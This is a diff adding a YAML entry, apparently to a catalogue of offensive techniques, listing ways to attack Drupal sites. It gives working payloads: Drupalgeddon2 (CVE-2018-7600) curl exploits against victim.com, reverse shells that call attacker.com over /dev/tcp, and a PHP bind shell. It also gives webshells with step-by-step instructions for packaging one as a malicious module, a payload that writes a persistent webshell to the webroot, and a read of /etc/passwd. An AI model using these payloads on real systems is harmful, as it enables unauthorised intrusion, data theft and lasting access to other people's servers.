@@ -1,0 +1,114 @@
+---
+comment: "Drupal is a PHP-based CMS. Three independent exploitation paths exist:\n\
+  \n1. CVE-2018-7600 (Drupalgeddon2) \u2014 unauthenticated RCE via the Form API AJAX\
+  \ handler.\n   The #post_render callback is not sanitised, allowing arbitrary PHP\
+  \ function calls.\n   Affects Drupal < 7.58 and Drupal 8.x < 8.3.9 / < 8.4.6 / <\
+  \ 8.5.1. Listed in the\n   CISA KEV catalog; widely exploited in the wild.\n\n2.\
+  \ PHP filter module (Drupal 7.x core only) \u2014 admin users can embed and execute\
+  \ PHP\n   directly inside page/article content via the built-in \"PHP code\" text\
+  \ format.\n   The module was removed from Drupal 8 core but may be installed as\
+  \ a contrib module.\n\n3. Custom module upload \u2014 any admin user with \"administer\
+  \ modules\" permission can install\n   a ZIP archive containing arbitrary PHP files,\
+  \ which are then served directly by the\n   web server from the modules directory.\n"
+functions:
+  bind-shell:
+  - code: |
+      <?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",12345);socket_listen($s,1);$c=socket_accept($s);$p=proc_open("/bin/sh",array(0=>$c,1=>$c,2=>$c),$x); ?>
+    comment: |
+      Package as a module PHP file (see webshell entry for packaging instructions) and
+      trigger via an HTTP request to the module file. The page hangs while the bind shell
+      awaits a connection on port 12345. Requires the PHP sockets extension.
+    connector: tcp-client
+    contexts:
+      admin:
+    tty: false
+  file-read:
+  - code: |
+      <?php echo file_get_contents('/etc/passwd'); ?>
+    comment: |
+      Inject into a Drupal 7 PHP filter page body or into a module PHP file. The file
+      content is returned inline in the HTTP response when the node/page is requested.
+    contexts:
+      admin:
+  file-write:
+  - code: |
+      <?php file_put_contents('/var/www/html/drupal/shell.php','<?php system($_GET["c"]); ?>'); ?>
+    comment: |
+      Inject into a PHP filter page or module file. Writes a secondary webshell to the
+      Drupal webroot for persistent access. Adjust the path to match the target's document
+      root (commonly /var/www/html, /var/www/drupal, or /srv/www).
+    contexts:
+      admin:
+  rce:
+  - code: "# Drupal 8.x \u2014 AJAX user registration handler\ncurl -s \\\n  'http://victim.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'\
+      \ \\\n  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=id'\n"
+    comment: |
+      CVE-2018-7600 (Drupalgeddon2): the Form API AJAX handler passes #post_render
+      callbacks to call_user_func_array() without validation, executing any PHP callable.
+      Using passthru() with the command in #markup prints the full output directly.
+      Command output appears inline in the JSON response body's `data` array.
+      Ref: https://www.exploit-db.com/exploits/44448
+    contexts:
+      unauthenticated:
+    version: |-
+      8.x < 8.5.1 / < 8.4.6 / < 8.3.9
+  - code: "# Drupal 7.x \u2014 password reset form variant\ncurl -s \\\n  'http://victim.com/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id'\
+      \ \\\n  --data 'form_id=user_pass&_triggering_element_name=name'\n"
+    comment: |
+      CVE-2018-7600 (Drupalgeddon2): Drupal 7.x variant targeting the password reset form.
+      The name[] parameter is processed by the same unsanitised Form API path.
+      Command output appears in the JSON response body's `data` array.
+      Ref: https://www.exploit-db.com/exploits/44449
+    contexts:
+      unauthenticated:
+    version: |-
+      7.x < 7.58
+  - code: |
+      <?php if(isset($_GET['cmd'])){ passthru($_GET['cmd']); } ?>
+    comment: |
+      Enable the PHP filter module at /admin/modules (Drupal 7 core). Navigate to
+      /node/add/page, paste this snippet in the body, set the Text format dropdown to
+      "PHP code", and save. Trigger at the node URL with ?cmd=id appended.
+      In Drupal 8+, install the contrib php module first if available.
+    contexts:
+      admin:
+    version: |-
+      7.x
+  reverse-shell:
+  - blind: true
+    code: |
+      curl -s \
+        'http://victim.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
+        --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=bash+-c+"bash+-i+>%26+/dev/tcp/attacker.com/12345+0>%261"'
+    comment: "CVE-2018-7600: spawns a reverse bash shell via the Drupal 8 AJAX handler.\
+      \ Uses\nexec() (no output returned) so the HTTP response will not confirm execution.\n\
+      Check the listener \u2014 the connection arrives within seconds of the request.\n"
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    tty: false
+    version: |-
+      8.x < 8.5.1 / < 8.4.6 / < 8.3.9
+  - blind: true
+    code: |
+      <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &"); ?>
+    comment: |
+      Inject into a Drupal 7 PHP filter page or into a module PHP file (see webshell
+      entry for packaging instructions). Trigger by visiting the node/page. The reverse
+      shell runs asynchronously in the background.
+    contexts:
+      admin:
+    listener: tcp-server
+    tty: false
+  webshell:
+  - code: |
+      <?php if(isset($_REQUEST['c'])){echo "<pre>",shell_exec($_REQUEST['c']),"</pre>";}?>
+    comment: "Package this file as a minimal Drupal module and install at /admin/modules/install.\n\
+      Required directory structure (zip -r shell.zip shell/):\n\n  shell/shell.php\
+      \         \u2190 this file\n  shell/shell.info.yml    \u2190 module metadata:\n\
+      \    name: 'Shell'\n    type: module\n    core_version_requirement: '^8 || ^9\
+      \ || ^10 || ^11'\n\nAfter installing and enabling the module, access at:\nhttp://victim.com/modules/custom/shell/shell.php?c=id\n\
+      \nDrupal's .htaccess does not block direct PHP execution under the modules path.\n"
+    contexts:
+      admin:
+...
